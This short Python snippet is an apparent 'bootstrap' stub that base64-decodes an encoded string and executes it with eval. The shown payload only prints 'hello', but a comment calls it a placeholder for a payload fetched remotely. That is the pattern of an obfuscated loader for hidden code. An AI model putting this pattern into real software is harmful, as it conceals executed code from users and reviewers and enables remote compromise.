import base64
# bootstrap
payload = 'cHJpbnQoJ2hlbGxvJyk='  # placeholder, real one fetched remotely
eval(compile(base64.b64decode(payload), '<b>', 'exec'))
